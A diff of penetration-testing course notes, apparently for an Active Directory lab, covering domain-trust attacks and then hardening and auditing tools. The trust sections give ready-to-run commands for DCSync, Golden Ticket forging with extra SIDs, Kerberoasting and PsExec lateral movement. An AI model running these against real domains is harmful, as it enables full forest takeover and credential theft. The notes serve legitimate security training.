-# Repeat for FREIGHTLOGISTICS.LOCAL pointing to 172.16.5.238
-# BloodHound GUI: Analysis → "Map Domain Trusts"
+BloodHound: Map Domain Trusts query. Always confirm trusts are in scope before attacking them.
+
+## Attacking Domain Trusts - Child -> Parent (ExtraSids / SID History)
+
+No SID filtering inside a forest → forge a Golden Ticket from the child whose SID history contains the parent's Enterprise Admins SID. Ingredients: child krbtgt NT hash, child domain SID, fake username, child FQDN, parent Enterprise Admins SID (…-519).
+
+Gather (after DA in child):
+
+```cmd
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt        :: hash + child SID visible in output
 ```
-
-### Child → Parent Escalation (ExtraSids / Golden Ticket)
-
-**Required data:**
-
-- KRBTGT hash of child domain
-- Child domain SID
-- Target username (fake user ok)
-- Child domain FQDN
-- Enterprise Admins SID of root domain (root_SID + `-519`)
 
 ```powershell
-# Step 1: DCSync krbtgt of child domain
-mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
-# Note: Hash NTLM, Object Security ID (child SID)
-
-# Step 2: Get Enterprise Admins SID
+Get-DomainSID                                             :: child SID
 Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select objectsid
-# → S-1-5-21-3842939050-3880317879-2865463114-519
-
-# Step 3: Forge Golden Ticket (Mimikatz)
-mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
-
-# Verify + use
-klist
-ls \\academy-ea-dc01.inlanefreight.local\c$
-mimikatz # lsadump::dcsync /user:INLANEFREIGHT\administrator /domain:INLANEFREIGHT.LOCAL
-
-# Step 3 alt: Rubeus
-.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
 ```
 
+Forge (Windows):
+
+```cmd
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+```
+
+```powershell
+.\Rubeus.exe golden /rc4:<KRBTGT_HASH> /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:<CHILD_SID> /sids:<EA_SID> /user:hacker /ptt
+```
+
+Then `ls \\academy-ea-dc01.inlanefreight.local\c$` works, and DCSync against the parent (`lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL` — specify the domain when it differs from the user's).
+
+Forge (Linux):
+
 ```bash
-# From Linux
-# Step 1: Get krbtgt hash
-secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
-
-# Step 2: Get child domain SID
-lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
-
-# Step 3: Get Enterprise Admins SID
-lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
-# Enterprise Admins RID = 519
-
-# Step 4: Forge ticket
-ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
-
-# Step 5: Use ticket
+secretsdump.py logistics.inlanefreight.local/<CHILD_ADMIN>@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
+lookupsid.py logistics.inlanefreight.local/<USER>@172.16.5.240 | grep "Domain SID"        # child SID
+lookupsid.py logistics.inlanefreight.local/<USER>@172.16.5.5 | grep -B12 "Enterprise Admins"   # parent SID + EA RID
+ticketer.py -nthash <KRBTGT_HASH> -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid <CHILD_SID> -extra-sid <EA_SID> hacker
 export KRB5CCNAME=hacker.ccache
 psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
-secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-
-# Automated
-raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
 ```
 
-### Cross-Forest Trust Abuse
+`raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/<CHILD_ADMIN>` automates the whole flow (EA SID → krbtgt → golden ticket → parent admin creds → PsExec). Understand the manual path first — autopwn scripts break in ways you can't troubleshoot, and clients don't accept "the script did it."
+
+## Attacking Domain Trusts - Cross-Forest Trust Abuse
+
+- **Cross-forest Kerberoasting** — works when the trust direction lets you authenticate:
+
+```powershell
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
 
 ```bash
-# Cross-forest Kerberoasting
-GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
-GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley -request
+```
 
-# Foreign group membership (users from one domain in groups of another)
+Crack → admin in the second forest; also spray the cracked password against same-name accounts in your own domain.
+
+- **Foreign group membership** — only Domain Local groups take foreign principals; a Domain A admin inside Domain B's built-in Administrators = instant cross-forest admin:
+
+```powershell
 Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
-Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
-# If INLANEFREIGHT\administrator is in FREIGHTLOGISTICS Administrators group:
+Convert-SidToName S-1-5-21-...-500
 Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 ```
 
----
+- **SID History across forests** — same ExtraSids idea where SID filtering isn't enforced on a migration trust.
+- **Cross-forest BloodHound** — point `/etc/resolv.conf` at each forest's DC in turn, collect with bloodhound-python per domain, upload both, run "Users with Foreign Domain Group Membership".
 
-## AD Auditing Tools
+## Hardening Active Directory
 
-```bash
-# PingCastle — risk scoring + reports
-PingCastle.exe → 1 (healthcheck) → enter DC FQDN
-# Generates HTML report with risk score, anomalies, stale objects
+Document/audit (annually at least): naming conventions, DNS/DHCP, all GPOs + targets, FSMO roles, app inventory, host list, every trust, elevated users.
 
-# ADRecon — comprehensive data collection
-.\ADRecon.ps1
-# Outputs CSV folder + GPO HTML report
-# Generate Excel from different host: .\ADRecon.ps1 -GenExcel <report_folder>
+People: strong password policy + filter (months/seasons/company name banned), rotate service account passwords, no local admin on workstations, kill RID-500 in favor of a LAPS-managed admin, tiered administration, trim privileged groups (50+ DAs is a finding), Protected Users group where safe (blocks delegation, NTLM, DES/RC4, credential caching; TGT ≤ 4h — test before rolling out, it breaks auth in surprising ways).
 
-# Group3r — GPO vulnerability finder
-group3r.exe -f findings.log
+Processes: provisioning/decommissioning policies, gold images, stale-record cleanup, scheduled AD audits.
 
-# adidnsdump — enumerate all DNS records
-adidnsdump -u domain\\user ldap://<DC_IP> -r
+Technology: run BloodHound/PingCastle/Grouper internally; no passwords in description fields or SYSVOL; gMSA/MSA instead of normal service accounts (kills Kerberoasting); disable unconstrained delegation; jump hosts for DC access; `ms-DS-MachineAccountQuota = 0` (blocks noPac, RBCD); disable the spooler; disable NTLM on DCs; EPA + SSL-only on AD CS web enrollment; SMB + LDAP signing; restrict null sessions (`RestrictNullSessAccess=1`); quarterly-to-annual AD pentests; tested backups.
 
-# AD Explorer (Sysinternals) — snapshot AD for offline analysis
-# File → Create Snapshot → save .dat file
-# Load snapshot → browse offline
-```
+MITRE view of module TTPs: poisoning = T1557 (SMB signing defeats it), spraying = T1110/003 (4624/4648 monitoring, lockout policy, MFA), Kerberoasting = T1558.003 under TA0006 (strong etypes, gMSA).
 
-> [!tip] Tool selection summary: **BloodHound** = attack path visualization + ACL chains. **PingCastle** = quick risk score for client report. **Snaffler** = credential hunting in shares. **Group3r** = GPO misconfigs. **ADRecon** = comprehensive data export. **adidnsdump** = hidden DNS records.
+## Additional AD Auditing Techniques
 
-> [!warning] Always document every change made during an assessment: passwords changed, groups modified, fake SPNs added, tickets forged. Clean up in reverse order. Include all changes in final report.
+- **AD Explorer** (Sysinternals) — browse AD like a database; File → Create Snapshot for offline diffing (before/after comparisons).
+- **PingCastle** — healthcheck report scores the domain on a CMMI-based maturity model; interactive menu (healthcheck / conso / carto / scanner — scanner includes nullsession, localadmin, spooler, zerologon, smb checks). Great client-facing artifact.
+- **Group3r** — GPO vulnerability finder; `group3r.exe -f <file.log>` or `-s` for stdout; run as any domain user from a domain-joined host (or runas /netonly). Indented output = GPO → setting → finding.
+- **ADRecon** — `.\ADRecon.ps1` sweeps domain/forest/trusts/users/groups/OUs/GPOs/DNS/computers into CSV + HTML (Excel needed for the full report; regenerate later with `-GenExcel`).
